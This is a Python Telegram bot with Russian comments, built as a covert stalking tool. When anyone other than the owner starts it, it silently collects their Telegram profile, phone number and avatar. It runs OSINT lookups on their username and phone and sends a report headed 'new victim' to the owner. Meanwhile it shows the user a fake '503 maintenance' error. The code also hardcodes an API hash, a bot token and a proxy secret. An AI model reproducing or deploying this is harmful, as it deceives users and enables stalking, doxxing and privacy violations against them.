from pyrogram import Client, filters
from pyrogram.types import Message
import requests
import re
import json
from datetime import datetime

# ========== КОНФИГУРАЦИЯ ==========
API_ID = 26016868
API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
OWNER_ID = 1185238446

# НАСТРОЙКА MTProto ПРОКСИ
PROXY = {
    "scheme": "mtproto",  # тип прокси
    "hostname": "nitro.alotaxi.info",
    "port": 4515,
    "secret": "eee9a4f23b1d768c04a8d7f39120ca5b6e626973636f7474692e79656b74616e65742e636f6d"  # ключ
}

# СОЗДАНИЕ КЛИЕНТА С ПРОКСИ
app = Client(
    "steel_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    proxy=PROXY
)

# ========== МОДУЛИ ПРОБИВА ==========
def search_socialmedia_by_username(username: str) -> dict:
    results = {}
    platforms = {
        "Twitter": f"https://twitter.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}/",
        "GitHub": f"https://github.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "Telegram": f"https://t.me/{username}",
        "VK": f"https://vk.com/{username}"
    }
    for platform, url in platforms.items():
        try:
            resp = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if resp.status_code == 200:
                results[platform] = url
        except:
            pass
    return results

def search_by_phone(phone: str) -> dict:
    results = {}
    phone_clean = re.sub(r"\D", "", phone)
    if len(phone_clean) == 11 and phone_clean.startswith("8"):
        phone_clean = "7" + phone_clean[1:]
    try:
        resp = requests.get(f"https://api.iphone.ru/phoneinfo?phone={phone_clean}", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            results["operator"] = data.get("operator", {}).get("name")
            results["region"] = data.get("region")
    except:
        results["operator"] = "Не определен"
        results["region"] = "Не определен"
    return results

# ========== ПРИВЕТСТВИЕ ДЛЯ ВЛАДЕЛЬЦА ==========
@app.on_message(filters.command("start") & filters.user(OWNER_ID) & filters.private)
async def owner_start(client: Client, message: Message):
    await message.reply(
        "✅ **Бот активирован**\n\n"
        f"📌 Ваш ID: `{OWNER_ID}`\n"
        "🔒 Режим: скрытый сбор данных\n"
        "🛡 Заглушка: активна\n"
        "🌐 Прокси: MTProto подключен\n\n"
        "**Команды:**\n"
        "/stats - статус бота\n"
        "/test @username - пробив username\n"
        "/test 79123456789 - пробив номера"
    )

# ========== ОСНОВНАЯ ЛОГИКА ДЛЯ ВСЕХ ОСТАЛЬНЫХ ==========
@app.on_message(filters.command("start") & filters.private & ~filters.user(OWNER_ID))
async def stealth_stalker(client: Client, message: Message):
    user = message.from_user
    
    # Сбор данных из Telegram
    user_info = {
        "user_id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "phone_number": user.phone_number or "Скрыт",
        "is_bot": user.is_bot,
        "is_scam": user.is_scam,
        "is_fake": user.is_fake,
        "language_code": user.language_code,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Пробив по открытым источникам
    osint_data = {}
    if user.username:
        osint_data["social_media"] = search_socialmedia_by_username(user.username)
    if user.phone_number:
        osint_data["phone_info"] = search_by_phone(user.phone_number)
    
    # Формирование отчета для владельца
    report = f"""
[НОВАЯ ЖЕРТВА]

┌─────────────────────────────────
│ ID: {user_info['user_id']}
│ Username: @{user_info['username']}
│ Имя: {user_info['first_name']} {user_info['last_name']}
│ Телефон: {user_info['phone_number']}
│ Язык: {user_info['language_code']}
│ Скам/фейк: {user_info['is_scam']}/{user_info['is_fake']}
│ Время: {user_info['timestamp']}
└─────────────────────────────────

--- ОСINT ДАННЫЕ ---
{json.dumps(osint_data, indent=2, ensure_ascii=False)}

--- ПРЯМАЯ ССЫЛКА ---
tg://user?id={user_info['user_id']}
"""
    
    # Отправка отчета владельцу
    await client.send_message(OWNER_ID, report)
    
    # Отправка аватара владельцу
    try:
        photos = await client.get_chat_photos(user.id, limit=1)
        if photos:
            avatar_path = await client.download_media(photos[0].file_id)
            await client.send_photo(OWNER_ID, avatar_path, caption=f"Аватар @{user.username}")
    except Exception as e:
        await client.send_message(OWNER_ID, f"Не удалось получить аватар: {str(e)}")
    
    # ЗАГЛУШКА ДЛЯ ПОЛЬЗОВАТЕЛЯ
    await message.reply(
        "⚠️ Временно недоступно\n\n"
        "Сервис проходит техническое обслуживание.\n"
        "Пожалуйста, попробуйте позже.\n\n"
        "Код ошибки: ERR_503_SERVICE_UNAVAILABLE"
    )

# ========== КОМАНДЫ ДЛЯ ВЛАДЕЛЬЦА ==========
@app.on_message(filters.command("stats") & filters.user(OWNER_ID))
async def stats(client: Client, message: Message):
    await message.reply(
        "✅ **Бот активен**\n\n"
        f"👤 Ваш ID: `{OWNER_ID}`\n"
        "🎯 Режим: скрытый сбор данных\n"
        "🛡 Заглушка: активна\n"
        "🌐 Прокси: MTProto подключен\n"
        "📊 Статистика: данные приходят в этот чат"
    )

@app.on_message(filters.command("test") & filters.user(OWNER_ID))
async def test_search(client: Client, message: Message):
    args = message.text.split(" ", 1)
    if len(args) < 2:
        await message.reply("Использование:\n/test @username\n/test 79123456789")
        return
    
    target = args[1]
    if target.startswith("@"):
        username = target[1:]
        result = search_socialmedia_by_username(username)
        await message.reply(f"**Результат пробива @{username}:**\n```json\n{json.dumps(result, indent=2, ensure_ascii=False)}\n```")
    elif re.match(r"^[7-9]\d{10}$", target) or re.match(r"^8\d{10}$", target):
        result = search_by_phone(target)
        await message.reply(f"**Результат пробива номера {target}:**\n```json\n{json.dumps(result, indent=2, ensure_ascii=False)}\n```")
    else:
        await message.reply("Неверный формат. Используйте @username или номер телефона (10-11 цифр)")

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    print("=" * 50)
    print("БОТ ЗАПУЩЕН")
    print(f"API ID: {API_ID}")
    print(f"Токен бота: {BOT_TOKEN[:20]}...")
    print(f"ID владельца: {OWNER_ID}")
    print("Режим: скрытый сбор данных")
    print("Приветствие настроено только для владельца")
    print(f"Прокси: {PROXY['hostname']}:{PROXY['port']}")
    print("=" * 50)
    app.run()
